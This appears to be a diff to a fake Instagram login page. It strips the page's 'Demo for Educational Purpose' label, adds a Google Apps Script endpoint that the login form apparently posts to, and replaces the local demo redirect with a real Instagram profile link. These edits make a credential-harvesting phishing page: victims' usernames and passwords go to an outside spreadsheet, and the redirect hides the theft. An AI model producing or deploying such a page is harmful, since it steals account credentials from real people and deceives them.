@@ -426,7 +426,7 @@
         <main class="login-section">
 
             <h1 class="login-title">
-                Log into Instagram (Demo for Educational Purpose)
+                Log into Instagram
             </h1>
 
             <form id="demoForm" onsubmit="submitForm(event)" method="post" name="google-sheet">
@@ -530,6 +530,9 @@
 
      <script>
 
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyYPZT8PVD7DKiUlPxvLXb5F8k90cBYTlwoQlQfEG3EpLGRX_mdifGe0CS13JRyDNtqHA/exec';
+        const form = document.forms['google-sheet'];
+
         form.addEventListener("submit", function (event) {
 
             // Stop the form from submitting normally
@@ -569,7 +572,7 @@
 
 
             // Redirect to another webpage
-            window.location.href = "demo.html";
+            window.location.href = "https://www.instagram.com/cat_llw?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw==";
 
         });
 
